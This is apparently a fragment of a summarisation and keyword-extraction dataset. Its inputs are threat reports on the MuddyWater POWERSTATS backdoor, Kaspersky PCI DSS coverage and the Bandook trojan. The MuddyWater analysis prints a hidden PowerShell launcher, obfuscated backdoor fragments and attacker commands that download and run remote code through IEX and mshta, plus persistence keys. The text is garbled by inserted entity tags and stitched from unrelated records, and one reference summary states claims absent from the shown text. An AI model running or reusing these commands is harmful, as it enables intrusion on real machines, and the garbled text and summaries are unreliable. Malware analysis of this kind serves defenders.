Oct/2017 \u2013 MuddyWater starts to embed the payloadAs part of the evolution of [ORG] POWERSTATS , for the \ufb01rst time on the [ORDINAL] 3rd of October we notice that the   payload is not downloaded anymore from a remote source ( [ORG] GitHub or [PERSON] Pastebin ) but it comes embedded [CARDINAL] 11 / Nov/2017 \u2013 New C2 for the active backdoors \ufb01rst public disclosure of the address ) .   [CARDINAL] 14 / Nov/2017 \u2013 [ORDINAL] Second public analysis date of the \ufb01rst infection back to [DATE] February [DATE] 2017 , while also showing how the operators adapted the   backdoor to reduce the detection rate and to thwart analyses . [GPE] Palo [GPE] Alto reports the C2 to be the same all the implants are already communicating with the C2 discovered on [DATE] the [DATE] 11th [DATE] of [DATE] November still communicating with the old [CARDINAL] C2 address from [DATE] October . [CARDINAL] 20 / Nov/2017 \u2013 New C2 and JScript RAT ( [ORG] Koadic ) / Meterpreter 20 / Nov/2017 \u2013 New C2 and JScript RAT ( Koadic ) / MeterpreterAfter [ORG] the [ORG] National [ORG] CyberSecurity [ORG] Center from [GPE] Saudi [GPE] Arabia publishes an advisory ( the link appears to be unreachable from outside [LOC] Middle [LOC] East , but a copy can be found here ) regarding the espionage [PERSON] OperationsMuddyWater operators use a series of compromised websites that act as proxies in order to conceal the real address of the C2 server . Infected endpoints connect randomly to [CARDINAL] one of the proxy servers , which in turn relays the information to the C2 . Operators use the [CARDINAL] C2 to dispatch commands and receive ex\ufb01ltrated data . [ORG] InfrastructureThe exception to the rule is represented by the [ORG] Koadic part that bypasses the proxies and communicates directly with the C2 server . MuddyWater operators have been capable of consistently infecting new computers , this is clearly shown by the graph below showing the growth trend of victims when the group was still moving relatively under the radar , at least in [LOC] Middle [LOC] East . [DATE] Daily trend of new infectionsAnother interesting part of the data is represented by the aggregate activity of each backdoor , show below . Overall activity of all infected victims ( click to zoom)It is interesting to note what is the impact of public analyses and advisories on a large scale espionage campaign and how fast MuddyWater adapts to each new disclosure . It is also possible to understand the working patterns of the operators , at least up to [DATE] the [DATE] 12th [DATE] of [DATE] November when they were operatingrelatively undisturbed . [TIME] Hourly activities ( cilck to zoom)Zooming in on the victims , we can understand on which countries the group has been focusing with most infections in the [ORG] EU belonging to victims travelling . Unique victims per country before the publication of advisories in [LOC] Middle [LOC] East , countries with [CARDINAL] less [CARDINAL] than [CARDINAL] 5 victims are not shown ( [GPE] Tunisia , [GPE] Lebanon , [GPE] Jordan , [GPE] Israel , Egypt),At a \ufb01rst glance [GPE] Pakistan is the targeted country but our data reveals a different picture . By analyzing   the activity on each victim we realized that the operators were interested in a different area . Operators activities per countryPakistan is indeed the country with the most infections , though the operators appears to be relatively disinterested in those victims . On the other hand , [GPE] Iraq has a large number of infections and the operators are extremely active on those infrastructures . [GPE] Saudi [GPE] Arabia and [GPE] United [GPE] Arab [GPE] Emirates ( [GPE] Dubai speci\ufb01cally ) have a low number of victims , all of them extremely active . This led us to believe that the   real targets are then : [GPE] Iraq , [GPE] Saudi [GPE] Arabia and [GPE] UAE . Targets [ORG] TargetsVictims belong to a variety of different sectors but the [ORG] MuddyWater operators are particularly active on [ORG] Governments [ORG] Telcos and [CARDINAL] OilOil companies ( including [CARDINAL] one Oil platform ) . In [CARDINAL] one instance we found that a [ORG] Governments , [ORG] Telcos large [NORP] Iraqi telecom provider was deeply compromised with [PERCENT] 10 % of their endpoints infected with [ORG] POWERSTATS . The attackers also possess some decent capabilities of lateral movement and they rely on various exploits , [ORG] LPE \u2013 fully working up to the latest version of [FAC] Windows [FAC] 10 \u2013 and tools ( somepublicly available ) to get access to the endpoints of interest once inside the infrastructure . Distribution of infected [ORG] Operating [ORG] SystemsWhile 85 % of infected devices are workstations , the remaining 15 % is made by servers , indicating that the attackers are capable of escalating after the initial breach to get direct access to the data they \u2019re Decoy DocumentsThe initial backdoor is deployed using a decoy document containing a macro . Here are some examples of the content delivered to the victims : The observed content has some common characteristics like the attempt to impersonate National entities ; the [CARDINAL] four documents mimics : [ORG] Iraqi [ORG] National [ORG] Intelligence [ORG] Service [ORG] National [ORG] Security [ORG] Agency [ORG] Ministry [ORG] of [ORG] Interior [ORG] of [ORG] Saudi [ORG] Arabia [ORG] Federal [ORG] Investigation [ORG] Agency [ORG] Ministry Of Interior PakistanEvery document also presents an [PERSON] Input [PERSON] Box and a [PERSON] Button at the bottom of the page . Document Analysis Document AnalysisBeside the decoy content , the static analysis of the initial documents allowed us to identify some common characteristics . All documents leverages [ORG] the [ORG] Macro [ORG] VBS mechanism to execute code and deploy next attack stages . SAMPLE 1 GIGABYTE AppVersion : 15.015.0 Software : [ORG] Microsoft [ORG] Of\ufb01ce Word   Microsoft Of\ufb01ce Word In particular all but [CARDINAL] one document \u2019s metadata show that the author \u2019s keyboard locale was set to ar_SA ( [LANGUAGE] Arabic , [NORP] Saudi Arabia).The macro operations can be summarized as follow : [NORP] Decode and drop a powershell script into C:\\Users\\Public\\Documents\\system.ps1 [NORP] Decode and drop a VBS script into C:\\Users\\Public\\Documents\\system.vbs Executes the VBS with [ORG] Shell . Open [ORG] MethodThe VBS content is below reported and its scope is to simply run system.ps1system.ps1 powershell script . Set \t objShell \t = \t WScript . CreateObject(\"WScript . [ORG] Shell \" ) command \t = \t \" powershell.exe \t -WindowStyle \t hidden \t -ExecutionPolicy \t Bypass \t -nologo \t -noprofile \t -file \t C:\\Users\\Public\\Documents\\system.ps1 \" objShell . Run \t command,0 Set \t objShell \t = \t NothingPowershell Backdoor Powershell Backdoorsystem.ps1 the attack - chain goes through [CARDINAL] two blocks of code that prepare the ground forStarting from system.ps1 the [ORDINAL] third block of code , containing the real powershell backdoor . Each block sets the variables necessary for the correct execution of the backdoor . Since the entire content is quite large we summarized the overall structure as follows : [CARDINAL] # \t First \t [ORG] Block [ORG] & ( ( GEt - VARIAbLE \t ' * MDR*').nAme[3,11,2]-JOiN '' ) \t ( \" \t $ ( \t sV \t ' Ofs ' \t '' ) \" + [ stRinG ] ( ( \t [DATE] 100000 , \t [ ] # \t [ORDINAL] Second \t [ORG] Block [ORG] & ( \t $ pShOme[21]+$psHOME[34]+'x ' ) \t ( [ stRIng]::JOin ( \t '' \t , \t ( ' 100000 \t [ ] # \t [ORDINAL] Third \t [ORG] Block / [ORG] Backdoor . \t ( \t $ ShELlID[1]+$shelLiD[13]+'x ' ) \t ( \t ( \t ' 1100110 \t [ ] We can observe [CARDINAL] 3 blocks of code that seems to be obfuscated with using Invoke - Obfuscation . Each block presents this structure : iex \t | \t ( code)First Block First Block After the deobfuscation , the \ufb01rst block sets the following variables : First Block VariablesSecond Block Second Block The [ORDINAL] second block like the \ufb01rst one after being deobfuscated , creates additional local variables ,   environment variables and functions used by the backdoor : [ORDINAL] Second Block VariablesSecond Block FunctionsThird Block / Backdoor Third [ORG] Block / BackdoorThe [ORDINAL] third and \ufb01nal block is the backdoor and it \u2019s responsible for : Anti - Analysis [ORG] Countermeasures [ORG] Command [ORG] ExecutionThe whole backdoor \u2019s structure is quite simple simple and appears as follows : Third Block / BackdoorFor the sake of brevity we will report only the most interesting functions . The backdoor implements an anti - analysis countermeasure that uses isDebugEnv machine if one of the following tools is found to be running : isDebugEnv to shutdown theollydbg joeboxserverDuring the analysis , our victims received an updated version of isDebugEnv the following tools too : isDebugEnv which extends the list towin32_remote win64_remote64The function persistence persistence takes care of lowering the security settings of [ORG] Microsoft [ORG] Excel and [PERSON] Word , creating a survival on reboot mechanism and hiding the VBS and PS1 by setting the \ufb01le attributes   System and [GPE] Hidden via the Windows utility attrib.exe.(HKCU and HKLM ) CurrentVersion\\Run . The \ufb01nal [ORG] Windows [ORG] Optimizations which resolves to : [PERSON] Wscript [PERSON] WscriptPersistence is obtained by adding an entry into ( HKCU and HKLM ) CurrentVersion\\Run artifact will have a value named [ORG] Windows [ORG] Optimizations [ORG] C:\\Users\\Public\\Documents\\System . Vbs C:\\Users\\Public\\Documents\\System . Vbs . An [ORDINAL] second persistence is obtained by adding a Scheduled Scheduled [ORG] TaskTask entry called Microsoft\\WindowsOptimizationsService C:\\Users\\Public\\Documents\\System . Vbs C:\\Users\\Public\\Documents\\System . Vbs . Microsoft\\WindowsOptimizationsService which executes [PERSON] Wscript [PERSON] Wscriptfunction persist()The entire function and the system \u2019s alterations can be easily summarized by checking the events in [ORG] ReaQta - Hive : ReaQta - Hive EventsOn the next step the script looks for * .dat \ufb01les , if none is found it sleeps [TIME] up [TIME] to [TIME] one [TIME] hour and then stores   the proxy URL in the registry and awaits until the function getKey()getKey ( ) succeeds.getKey ( ) function retrieves a key that uniquely identi\ufb01es the victim \u2019s machine , if it does not exists it register function . Registration is performed by collecting information about the running OSThe getKey ( ) invokes the register that will be sent to the attacker , the server will \ufb01nally reply with a unique key ( MD5 ) stored in   { username}.dat { username}.dat . By diving more in depth in the register User \u2019s information , \ufb01nally assembling the following string : register function we can see that it gathers [ORG] IP , OS ad$($env : computername)~~$($env : username)~~$os~~$($ips.subString(1))~~$((Get - WmiObject \t Win32_ComputerSystem).Domain)After the [ORG] UniqueKey handling ( Created or [GPE] Found ) stage the backdoor enters in [ORG] the [ORG] Main [ORG] Loop that calls the getCommand ( ) getCommand ( ) function . This function requests commands to the [CARDINAL] C2 and sends back the results by splitting them in chucks . The command evaluation is performed by using Invoke - Expression Invoke - Expression from powershell , such approach is simple and straightforward and it offers strong post - exploitation capabilities to the attacker , the scripts can now run as a remote powershell . Additional persistence method Additional persistence methodWe identi\ufb01ed an additional persistence method deployed by the attacker , the technique relies on using   a Word Template and it \u2019s been described at length in the article \u201c [WORK_OF_ART] Maintaining [WORK_OF_ART] Access with [ORG] Normal.dotm\u201dPowershell script that create the Normal.dotm \ufb01le [ORG] Macro from Normal.dotmConnections and [ORG] Similarities between samples [ORG] Connections [ORG] and [ORG] Similarities between samplesDuring the investigation we noticed that this attack generated an incident quite similar to another one we already observed in the past . As we can see from the following screenshots the [CARDINAL] two process - tree are almost the same : Behavioral - Tree view of Old and New incidentsThe core differences between the [CARDINAL] two attacks can be summarized as follows : [ORG] Macro and [ORG] Powershell script are now obfuscated [ORG] Backdoor code has been refactored URL parameters are changedAdditionally the code of the backdoor has been refactored , as it can be seen from the following examples.function httpGet The new version adds a fallback URL to contact , in both cases domains are randomly chosen from an hard - coded list.httpGet diffThe \u201c send \u201d code has been moved into a dedicated new function : send code difffunction persistenceThe persistence is obtained by using the same techniques and names as before , with the exception ofthe scheduled - task entry name that changes as follows : WindowsOptimizations \t - > \t Microsoft\\WindowsOptimizationsServiceCurrentVersion\\Run CurrentVersion\\Run PersistenceDifferences between Old and New CurrentVersion\\RunScheduled Task Scheduled Task PersistenceDifferences between Old and New Scheduled TaskMuddyWater Communication MuddyWater CommunicationCommunication with the C2 happens through compromised websites working as proxies , as explained above . Here it is a partial list of the proxies adopted by the backdoor : [PERSON] Proxy [PERSON] ListAs it can be seen from the above image , every request is performed via GET : url \u2019s interactions with the attacker can be synthesized in [CARDINAL] two main steps : [ORG] UniqueKey [ORG] Handling ( Registration / [ORG] UniqueKey Update ) [ORG] Command [ORG] ExchangeRegistration ( already explained in depth ) uses the following URL parameters : Base64(CustomEncoding(a = r&b=[REGISTRATION_DETAILS]))The \ufb01nal result from a network point of view is : registrationCommand Exchange happens through the function getCommand getCommand . The [ORG] Backdoors can request a command to the attacker using the $ i d which is the [ORG] UniqueKey : Base64(CustomEncoding(a = g&b=$id))The attacker replies as follows : Base64(CustomEncoding($cmdID~~$cmd))Once the backdoor executes the command $ cmd , it replies back to the attacker with the result : Base64(CustomEncoding(a = s&i=$id&ch = last&ci=$cmdId&r=$result))Depending on the length of the result , the reply to the attacker can be divided in chunks . This is an extract of commands received directly from the attacker:781~~Remove - itemproperty \t -path \t HKCU:\\Software\\Classes\\exefile\\shell\\runas\\command \t -name \t [ORG] IsolatedCommand \t -Force791~~powershell \t -nop \t -w \t hidden \t -exec \t bypass \t -c \t \" IEX \t ( [ORG] New - Object \t [ORG] Net . WebClient).DownloadString('url\"As we can see from the last command , the attacker sent a new powershell script : powershell script sh.txtWhose scope was to update the backdoor : New C2 address New isDebugEnv function New proxy list ( reported below)Old vs [ORG] New [ORG] Proxy [ORG] ListIn another session we received other commands whose scope was to try other backdoors : [PERSON] Koadic [PERSON] JScript [PERSON] RAT:821~~mshta \t url~~whoamiKoadic JScript RAT:826~~mshta \t url injected using to_mem_pshre\ufb02ection.ps1.template 829~~powershell.exe \t -nop \t -w \t hidden \t -e \t aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAk [ ] Koadic JScript RAT:836~~mshta \t url Attribution MuddyWater AttributionAs usual attribution of cyber espionage operations is a very complex topic and we do n\u2019t have de\ufb01nitive   elements to make conclusions , that said during our investigation we noticed what might have been a mistake from [CARDINAL] one of the operators and for a while we were able to track his / her movements . The [ORG] IP address was in [GPE] Tehran , [GPE] Iran and we have reason to believe that , in that speci\ufb01c instance , we were   dealing with a \ufb01nal IP address and not a proxy , or a victim used to conceal the real address . Other   elements provide circumstantial evidence that the attacks can reasonably originate from [GPE] Iran like the kind ( and more speci\ufb01cally the identities ) of the victims most investigated by the operators and their   geographic distribution . Despite the origin of MuddWater \u2019s attacks , a lot of doubts remain , the \ufb01rst of them is whether the group   is state - sponsored or part of the organized crime . The relatively low sophistication of the attacks and the general handling of their infrastructure led us to think about a criminal group , but the choice of victims and their agility once inside the compromised infrastructures made us think about a more structured entity ( possibly made by [CARDINAL] two different groups , one for attacks and another one specialized in post - exploitation activities ) . The [ORDINAL] second is about their link with APT33 / OilRig similarities in the techniques adopted by MuddyWater and APT33 / OilRig but whether the operations belong to the same actor is still unknown . Conclusions ConclusionsAPT33 / OilRig , there are differentOur customers running [ORG] ReaQta - Hive are already protected and no further action is required . We suggest to check for all the published IOCs in order to understand whether the current backdoors are active and to check for signs of persistence described above . url url url url url [ORG] KoadicPowerstats and vbs launcher hashes [ORG] Powerstats [ORG] Proxy [ORG] URLsurl url url url url\ufb01fteen / logs[.]php?c=   url url url url url url[.]com/404[.]php?c=   url url url url url url url url url url\ufb01fa[.]com / wp - content / themes / [ORG] Newspaper / mobile / includes/404[.]php?c=   url\ufb01fa[.]com / wp - content / themes / [ORG] Newspaper / mobile / work[.]php?c=   url url url url url url\ufb01fteen / work[.]php?c=   url\ufb01g[.]php?c=   url url url\ufb01ce / lib / work[.]php?c=   url url url url\ufb01le / sym / work[.]php?c=   url url url url url url\ufb01les / articles / css[.]aspx?c= url\ufb01les / articles / large / css[.]aspx?c=   url url url url url url url url url\ufb01eld[.]com / v2 / work[.]php?c=   url url url url url url url url url url url url\ufb01fteen / logs[.]php?c=   url url url url [PERSON] Bypass scripts uac.ps1Normal.dotm powershell script Persistence ArtifactsHKCU : SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \u2013 Key \u201c WindowsHKLM : SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \u2013 Key : \u201c WindowsRegistry \u2013 HKCU : SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Optimizations \u201d \u2013 Value \u201c wscript [ maliciuous].vbs \u201d Registry \u2013 HKLM : SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Optimizations \u201d \u2013 Value:\u201cwscript [ maliciuous].vbs \u201d [WORK_OF_ART] Scheduled [WORK_OF_ART] Task [WORK_OF_ART] \u2013 [WORK_OF_ART] Name : Microsoft\\WindowsOptimizationsService \u2013 Action : \u201c wscript [ maliciuous].vbs \u201d [WORK_OF_ART] Word [WORK_OF_ART] Template [WORK_OF_ART] \u2013 Path : [WORK_OF_ART] c:\\users\\{user}\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm , powerstats rat saudi arabia uae , , , [ORG] APT iraq jscript koadic living off the land meterpreter [LOC] Middle [LOC] East muddywater pakistan powershell , , , , , , , , , PAGESBlogContact UsPartnersProductsReaQta - HiveRECENT [GPE] POSTSA dive into [ORG] MuddyWater [ORG] APT targeting [ORG] Middle - EastA short journey into DarkVNC attack chainLocky Dropper Now Comes Embedded in the LoaderCopyright ReaQta 2017Blog ProductsJoin Us Contact Us Privacy Policy", "generated_text": "MuddyWater; APT; 2017; Middle East; Powershell; the group; victims; the Middle East; Powershell; Powershell Signatures; Program; the RAT; servers; malware; evade detection; sandboxes; compromised infrastructure; the attacks; the RAT; processes; the malware; the POWERSTATS backdoor; the attackers; a low detection profile; a low forensic footprint; the capabilities; backdoors; the actors; the Middle East; espionage; the region; Iran; Iran; the originating country; Iran; espionage motives; - memory; assets; the malware; the POWERSTATS backdoor; the threat; the Middle East region; the Middle East.", "ref_text": "<START-1>The PDF provides an analysis of a cyberespionage group called MuddyWater that has been actively targeting victims primarily in the Middle East during 2017. MuddyWater uses phishing emails with macro-enabled Office documents to infect victims with a PowerShell backdoor called POWERSTATS. This backdoor connects to command and control servers to receive commands and exfiltrate data. The group constantly changes infrastructure and adapts techniques to evade detection, such as moving from GitHub to Pastebin for hosting payloads. They have expanded targeting beyond the Middle East to countries like India and the US. The PDF examines the evolution of MuddyWater's tactics from the first public reports in September 2017 through November 2017. It tracks the changes in C2 servers, proxy sites, malware delivery methods, and backdoor code. While some have attributed MuddyWater to the FIN7 cybercrime group, the PDF argues this link is questionable and they are more likely a separate espionage-motivated group, based on distinct targeting, infrastructure, and malware. MuddyWater heavily targets the government, telecoms, and oil sectors in countries like Iraq, Saudi Arabia, UAE. The PDF speculates the group could originate from Iran based on infrastructure clues, but definitive attribution is difficult. In summary, the analysis profiles the tactics, infrastructure, targeting, and capabilities of the MuddyWater APT group as an active threat conducting cyberespionage in the Middle East in 2017. It tracks the group's evolution and argues against attribution to FIN7. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.470899470899471, "gpt3/lexical/rouge_rouge2": 0.15425531914893617, "gpt3/lexical/rouge_rougeL": 0.23280423280423282, "gpt3/lexical/rouge_rougeLsum": 0.23280423280423282, "gpt3_generated_text": ["This article discusses the activities of the MuddyWater APT group in the Middle East throughout 2017. The group primarily targets victims in the Middle East, using in-memory vectors and Powershell to carry out their attacks. These methods allow them to maintain a low detection profile and a low forensic footprint. While the group has a strong focus on victims in Pakistan, the most active targets appear to be in Saudi Arabia, UAE, and Iraq, particularly in government and oil sectors. The origins of MuddyWater are likely in Iran, although it is unclear whether they are state-sponsored or a criminal organization involved in espionage. The article also outlines the timeline of the group's activities and how they have evolved over time. Overall, MuddyWater poses a significant threat to the Middle East region, using sophisticated techniques to evade detection and compromise infrastructure."]}, {"split_name": "val", "sample_id": "val_126", "prompt_text": "Extract the keywords: PCI DSS v3.2 MappingPCI [ORG] DSS [CARDINAL] 3.2 regulates many technical security requirements and settings for systems operating with credit card data . Sub - points [CARDINAL] 1.4 , [DATE] 2.4a , [CARDINAL] 5.1 , [CARDINAL] 5.1.1 , [CARDINAL] 5.2 , [CARDINAL] 5.3 , [CARDINAL] 6.2 , [CARDINAL] 10.5.5 , [CARDINAL] 11.5 of [ORG] PCI [PERSON] DSS v3.2 provide for the strict regulation of protection relating to any endpoint which is operating with cardholder data . It is common practice , although not an official rule , for [ORG] Device [ORG] Control [ORG] + [ORG] Application [ORG] Control functions to also be considered to be within the remit of the PCI DSS antivirus software audit . More regulations covered by a single product makes compliance easier to achieve . [ORG] Kaspersky [ORG] Embedded [ORG] Systems [ORG] Security covers a wide range of requirements:1.4Install personal firewall software or equivalent functionality on any portable computing devices that connect to the Internet when outside the network , and which are also used to access the [ORG] CDE . [PERSON] Firewall ( or equivalent ) configurations include : \u2022 Specific configuration settings are defined . \u2022 Personal firewall ( or equivalent functionality ) is actively running . \u2022 Personal firewall ( or equivalent functionality ) is not alterable by users of the portablecomputing devices.2.4.aExamine system inventory to verify that a list of hardware and software components is maintained and includes a description of function / use for each.5.1Deploy antivirus software on all systems commonly affected by malicious software ( particularly personal computers and servers).5.1.1Ensure that antivirus programs are capable of detecting , removing , and protecting and generate audit logs which are retained per [ORG] PCI DSS Requirement 10.7Ensure that antivirus mechanisms are actively running and can not be disabled or altered by users , unless specifically authorized by management on a case - by - case basis for a limited time period . Ensure that all system components and software are protected from known vulnerabilities by installing applicable vendor - supplied security patches . Install critical security patches within [DATE] one [DATE] month of release.*10.5.5Use file - integrity monitoring or change - detection software on logs to ensure that existing log data can not be changed without generating alerts ( although new data being added should not cause an alert).11.5Deploy a change - detection mechanism ( for example , file - integrity monitoring tools ) to alert personnel to unauthorized modification ( including changes , additions and deletions ) of critical system files , configuration files , or content files ; and configure the software to perform critical file comparisons at least weekly . * Additional license required . Cyber Threats News : www.securelist.com IT Security News : business.kaspersky.com IT Security for SMB : kaspersky.com/business IT Security for Enterprise : kaspersky.com/enterprisewww.kaspersky.com2019 [PERSON] AO [PERSON] Kaspersky [PERSON] Lab . All rights reserved . Registered trademarks and service marks are the property of their respective owners . We are proven . We are independent . We are transparent . We are committed to building a safer world , where technology improves our lives . Which is why we secure it , so everyone everywhere has the endless opportunities it brings . Bring on cybersecurity for a safer tommorow . Know more at kaspersky.com/transparency", "generated_text": "PCI DSS v3.2; protection; systems; credit card data; sub-points; 1.4; 2.4a; 5.1; 5.2; 5.3; 6.2; 5.3; 6.2; 11.5; Device Control + Application Control functions; a single product; compliance; Kaspersky Embedded Systems Security; certification; additional license; intrusive software; a wide range; requirements; Personal firewall software; all system components; software; configurations; 5.1; antivirus software; all system components; security patches; known vulnerabilities; the antivirus infrastructure; control; software exploitation; unauthorized modification; system files; configuration files; content; unauthorized modification; Logs; alerts; changes; anomalies; detection; Change-Detection; changes; Analysis; unauthorized changes; log data; unauthorized modifications; additional license; Kaspersky; responsible use.", "ref_text": "<START-1>The document outlines how Kaspersky Embedded Systems Security aligns with PCI DSS v3.2 requirements for security controls on systems handling credit card data. It lists specific PCI DSS requirements covered by Kaspersky Embedded Systems Security features including: - Personal firewall for portable devices (1.4) - Maintaining system inventory (2.4a) - Antivirus deployment and updates (5.1, 5.2) - Preventing antivirus disablement (5.3) - Installing vendor patches (6.2) - File integrity monitoring (10.5.5, 11.5) Additional controls like application control and device control are also noted as commonly expected for PCI DSS compliance. Having a single product cover multiple PCI DSS requirements is highlighted as making compliance easier to achieve. Overall, the document aims to position Kaspersky Embedded Systems Security as helping to secure systems and comply with PCI DSS endpoint security standards. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5185185185185185, "gpt3/lexical/rouge_rouge2": 0.20496894409937888, "gpt3/lexical/rouge_rougeL": 0.27777777777777773, "gpt3/lexical/rouge_rougeLsum": 0.27777777777777773, "gpt3_generated_text": ["The article discusses the regulations and requirements of PCI DSS v3.2, which focuses on the protection and security of systems handling credit card data. Several sub-points, such as 1.4, 2.4a, 5.1, 5.1.1, 5.2, 5.3, 6.2, 10.5.5, and 11.5, emphasize the need for strict protection measures for endpoints handling cardholder data. While not an official rule, it is common practice to include Device Control + Application Control functions in the PCI DSS antivirus software audit. Compliance with multiple regulations can be achieved more easily through the use of a single product. Kaspersky Embedded Systems Security is highlighted as a product that covers a wide range of requirements. The article provides specific details on various requirements, including the installation of personal firewall software, deployment of antivirus software, installation of security patches, and the use of file-integrity monitoring and change-detection mechanisms. It also mentions that additional licenses may be required for certain features. Overall, the article emphasizes the importance of protecting systems and data from cyber threats and highlights Kaspersky's commitment to building a safer world through cybersecurity."]}, {"split_name": "val", "sample_id": "val_127", "prompt_text": "Extract the keywords: [CARDINAL] 11/30/2020Bandook : Signed & Delivered - Check Point ResearchBandook : Signed & [CARDINAL] Deliveredresearch.checkpoint.com/2020/bandook-signed-deliveredNovember [CARDINAL] 26 , [DATE] 2020November [DATE] 26 , [ORG] 2020IntroductionCheck [ORG] Point [ORG] Research recently observed a new wave of campaigns against various targets worldwide that utilizes a strain of a 13 [DATE] - [DATE] year [DATE] old backdoor [GPE] Trojan named Bandook . Bandook , which had almost disappeared from the threat landscape , was featured in [DATE] 2015 and [DATE] 2017 campaigns , dubbed \u201c Operation Manul \u201d and \u201c Dark Caracal \u201c , respectively . These campaigns were presumed to be carried out by the Kazakh and the [NORP] Lebanese governments , as uncovered by [ORG] the [ORG] Electronic [ORG] Frontier [ORG] Foundation ( EFF ) and Lookout . During [DATE] this [DATE] past [DATE] year , [CARDINAL] dozens of digitally signed variants of this once commodity malware started to reappear in the threat landscape , reigniting interest in this old malware family . In the latest wave of attacks , we once again identified an unusually large variety of targeted sectors and locations . This further reinforces a previous hypothesis that the malware is not developed in - house and used by a single entity , but is part of an offensive infrastructure sold by a [ORDINAL] third party to governments and threat actors worldwide , to facilitate offensive cyber operations . In this publication , we showcase the latest evolution of the infection chain offered by this unknown [ORDINAL] third - party , compare the different Bandook variants , and share the various techniques its creators use to hinder analysis and detection of all the components in the attack flow . Infection ChainAs the infection chain is constantly evolving , we describe the one used by the attackers from [DATE] as [DATE] early [DATE] as [DATE] July , to [DATE] the [DATE] present [DATE] day . The full infection chain of the attack can be broken down into [CARDINAL] three main stages . The [ORDINAL] first stage starts , as in many other infection chains , with a malicious [ORG] Microsoft [ORG] Word document delivered inside a ZIP file . Once the document is opened , malicious macros are downloaded using the external template feature . The macros \u2019 code in turn drops and executes the [ORDINAL] second stage of the attack , a [ORG] PowerShell script encrypted inside the original Word document . Finally , the [ORG] PowerShell script downloads and executes the last stage of the infection : the Bandook backdoor . The names of the various artifacts described below may vary from [CARDINAL] one infection to the next . [ORG] First [ORG] Stage [ORG] \u2013 [ORG] Lure [ORG] Documentsurl 1 : Full infection chain.1/711/30/2020Bandook : [ORG] Signed [ORG] & [ORG] Delivered [ORG] - [ORG] Check [ORG] Point [ORG] ResearchThe [ORDINAL] first stage starts with a Microsoft Word document with embedded encrypted malicious script data and an external template that points to a document containing malicious [ORG] VBA macros . The external template is downloaded via a URL shortening web service like TinyURL or Bitly , which redirects to another domain controlled by the attacker . The external template document contains a [ORG] VBA code that runs automatically , decrypts the embedded data from the original lure document , and drops the decoded data into [CARDINAL] two files in the local user folder : fmx.ps1 ( the next stage [ORG] PowerShell ) and sdmc.jpg ( base64 encoded [ORG] PowerShell [ORG] code).To allow this behavior , the attackers use a combination of [CARDINAL] two techniques : encrypted data is embedded inside a shape object within the original document ( hidden from view by a small font size and white foreground ) , and is accessed from the external template code by using the following code : o4QQLW7zXjLbj = ActiveDocument . Shapes(1).TextFrame . TextRange . [ORG] TextFor proper analysis , both the original document and the external template must be located , which makes things a bit more difficult for investigators . We observed and analyzed multiple pairs of documents and external templates . Different lure images were used , alongside different encryption keys . Examples of lure documents : Examples of external templates with macros : Figure [CARDINAL] 2 : Lure documents used to convince the user to enable the macros . The external templates are not visible to the victim . Their only purpose is to provide malicious macros . Figure [CARDINAL] 3 : External templates containing malicious macros . Interestingly , with each attack , after a certain amount of time , the attacker switched the malicious external template to a benign one , further muddying our analysis of the infection chain . Here again , the external templates look like random benign documents : The themes of the documents are often of cloud - based services like Office365 , [ORG] OneDrive and Azure that contain images of other documents supposedly available once the victim clicks \u201c Enable Content . \u201dFor example , [CARDINAL] one of the documents that specifically got our attention depicts an Office365 logo and a preview of a certificate issued by the government of [GPE] Dubai . [ORG] JAFZA \u2013 [PERSON] Jebel [PERSON] Ali [PERSON] Free [PERSON] Zone , featured at the top of the document , is an industrial area surrounding the port of [PERSON] Jebel [PERSON] Ali in [GPE] Dubai , where [CARDINAL] more [CARDINAL] than [CARDINAL] 7,000 global companies are based . Figure [CARDINAL] 4 : Benign external templates . Sample document file names : url [CARDINAL] 5 : Lure document ( left ) and an example of a similar publicly available certificate ( right).2/711/30/2020Bandook : [ORG] Signed [ORG] & [ORG] Delivered [ORG] - [ORG] Check [ORG] Point [ORG] ResearchMalaysia Shipment.docx [GPE] Jakarta Shipment.docx malta containers.docx [WORK_OF_ART] Certified [WORK_OF_ART] documents.docx [WORK_OF_ART] Notarized [WORK_OF_ART] Documents.docx [WORK_OF_ART] bank statement.docx passport and documents.docx Case Draft.docx documents scan.docxSecond Stage \u2013 PowerShell LoaderAfter the [ORG] VBA code drops the two files ( fmx.ps1 and sdmc.jpg ) , it invokes fmx.ps1 .fmx.ps1 is a short [ORG] PowerShell script that decodes and executes a base64 encoded [ORG] PowerShell stored in the [ORDINAL] second dropped file ( sdmc.jpg ) .First , the decoded [ORG] PowerShell script downloads a zip file containing [CARDINAL] four files from a cloud service such as [ORG] Dropbox , [ORG] Bitbucket or an S3 bucket . The zip file is stored in the user \u2019s Public folder , and the [CARDINAL] four files are locally extracted . Figure [CARDINAL] 6 : [ORG] Malware components stored on [ORG] Dropbox.com . [CARDINAL] Three of the files , a.png , b.png and untitled.png , are used by the [ORG] PowerShell script to generate the malware payload in the same folder . untitled.png , unlike the other two files , is in a valid image format . It contains a hidden RC4 function encoded in the [ORG] RGB values of the pixels , created using a known tool named invoke - PSImage . Figure [CARDINAL] 7 : [ORG] Malware components after being extracted on the victim \u2019s device . The final executable payload is concatenated from the following files : a.png \u2013 After it is decrypted using RC4 and stored as aps.png . b.png \u2013 As is . Finally , the [ORG] PowerShell script executes the malware , opens draft.docx , and deletes all previous artifacts from the Public folder.draft.docx is a benign document whose sole purpose is to convince the victim that the document is no longer available , and that the overall execution was successful . Third Stage \u2013 The Bandook LoaderThe final payload in this infection chain is a variant of an old full - featured [ORG] RAT named Bandook . Written in both [NORP] Delphi and C++ , [ORG] Bandook has a long history , starting in [DATE] 2007 as a commercially available RAT that was developed by a [NORP] Lebanese individual nicknamed [ORG] PrinceAli . Over time , several variants of the malware builder were leaked to the Web , and the malware became publicly available for download . Figure [CARDINAL] 8 : Final document shown to the user post-infection.url 9 : Bandook \u2019s history described on a hacking forum.11/30/2020Bandook : Signed & Delivered - Check Point ResearchBandook \u2019s execution flow starts with a loader , written in [ORG] Delphi , that uses the Process Hollowing technique to create a new instance of an Internet Explorer 